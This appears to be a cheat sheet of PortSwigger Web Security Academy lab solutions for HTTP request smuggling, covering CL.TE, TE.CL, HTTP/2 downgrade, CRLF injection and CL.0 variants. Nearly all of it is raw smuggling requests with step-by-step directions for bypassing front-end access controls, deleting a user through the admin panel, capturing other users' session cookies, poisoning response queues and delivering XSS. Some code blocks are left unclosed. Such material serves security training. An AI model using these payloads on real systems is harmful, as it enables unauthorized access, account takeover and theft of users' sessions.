# HTTP request smuggling

## Description 
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

### HTTP request smuggling, basic CL.TE vulnerability

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

```
### HTTP request smuggling, basic TE.CL vulnerability

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### HTTP request smuggling, ofuscating the TE header, both server accept

```
Note
You need to include the trailing sequence \r\n\r\n following the final 0.

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

### HTTP request smuggling, confirm a CL.TE vulnerability via differential responses

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability


```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
Observe that the merged request to /admin was rejected due to not using the header Host: localhost.
Issue the following request twice:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
Issue the following request twice so the second request's headers are appended to the smuggled request body instead:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
Observe that you can now access the admin panel.
Using the previous response as a reference, change the smuggled request URL to delete the user carlos:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

### Exploting HTTP request smuggling to reveal front-end request rewriting CACHE

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Exploiting HTTP request smuggling to capture other users' request

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
Copy the user's Cookie header from the comment, and use it to access their account.

```

### Exploting HTTP request smuggling to deliver reflected XSS

```
Inject an XSS payload into the User-Agent header and observe that it gets reflected:

"/><script>alert(1)</script>
Smuggle this XSS request to the back-end server, so that it exploits the next visitor:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

### Response queque poisoning via H2.TE request smuggling

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.

POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### H2.CL request smuggling (Redirection)

```
Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows. Remember to expand the Inspector's Request Attributes section and change the protocol to HTTP/2 before sending the request.

POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

Using Burp Repeater, notice that if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/.

Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header:

POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.

Go to the exploit server and change the file path to /resources. In the body, enter the payload alert(document.cookie), then store the exploit.

In Burp Repeater, edit your malicious request so that the Host header points to your exploit server:

POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0
Disable FoxyProxy
GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```

### HTTP/2 request smuggling via CRLF injection (Use the script)
```
Expand the Inspector's Request Attributes section and change the protocol to HTTP/2.

Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:

Name

foo
Value

bar\r\n
Transfer-Encoding: chunked
In the body, attempt to smuggle an arbitrary prefix as follows:

0

SMUGGLED
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix

Change the body of the request to the following:

0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x
Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:

If you got lucky with your timing, you may see a 404 Not Found response. In this case, refresh the page again and move on to the next step.

If you instead see the search results page, observe that the start of your request is reflected on the page because it was appended to the search=x parameter in the smuggled prefix. In this case, send the request again, but this time wait for 15 seconds before refreshing the page. If you see a 404 response, just refresh the page again.

Check the recent searches list. If it contains a GET request, this is the start of the victim user's request and includes their session cookie. If you instead see your own POST request, you refreshed the page too early. Try again until you have successfully stolen the victim's session cookie.
```

### HTTP/2 request splitting via CRLF injection

```
Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject \r\n sequences to split the request so that you're smuggling another request to a non-existent endpoint as follows:

Name

foo
Value

bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net
Send the request. When the front-end server appends \r\n\r\n to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.

Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

Note
If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.

Copy the session cookie and use it to send the following request:

GET /admin HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=STOLEN-SESSION-COOKIE
Send the request repeatedly until you receive a 200 response containing the admin panel.
```

### CL.0 request smuggling

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
Change the path of the main POST request to point to an arbitrary endpoint that you want to test.

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

Change the Connection header of the first request to keep-alive.

Send the sequence and check the responses.

If the server responds to the second request as normal, this endpoint is not vulnerable.

If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.

Deduce that you can use requests for static files under /resources, such as /resources/images/blog.svg, to cause a CL.0 desync.

Exploit

In Burp Repeater, change the path of your smuggled prefix to point to /admin.

Send the requests in sequence again and observe that the second request has successfully accessed the admin panel.

Smuggle a request to GET /admin/delete?username=carlos request to solve the lab.

POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Length: CORRECT

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```
